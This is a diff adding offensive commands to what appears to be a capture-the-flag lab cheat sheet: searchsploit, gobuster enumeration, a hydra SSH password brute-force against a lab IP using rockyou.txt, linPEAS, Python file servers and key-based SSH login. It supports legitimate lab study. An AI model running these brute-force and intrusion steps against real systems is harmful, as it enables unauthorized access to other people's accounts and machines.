@@ -21,6 +21,26 @@ v=verbose [use twice to be more verbose]
 l=listen mode, for inbound connects    
 p=local port number  
 
+~$	searchsploit (Search for exploitable version history)  
+~$	gobuster dir -u http://10.10.98.4/ -w /usr/share/dirb/wordlists/common.txt   
+hydra	-L Username list  
+hydra	-l have Username  
+hydra	-P (Password List)  
+hydra	-p (Have the password)  
+
+$ hydra -l jan -P /home/angus/Downloads/CTF/Lists/rockyou.txt 10.10.98.4 ssh  
+
+cd linPEAS/ ; ls  
+
+python -m SimpleHTTPServer 80 (Python module)  
+python3 -m http.server  
+
+ip addr  
+
+ssh -i kay_key kay@10.10.98.4    (-i = identify file, to show you are this person)  
+
+
+
 [GTFO Bins](https://gtfobins.github.io/)  -  *GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.*  
 
 `find / -name *flag* -type f 2>/dev/null` - find"find cmd" / -name(Specify Name) *flag*(Wildcard "flag") -type(Specify Type) f(Specifies it is a file) 2>/dev/null (Output, 2 is standard error) Then cat the flag directories  
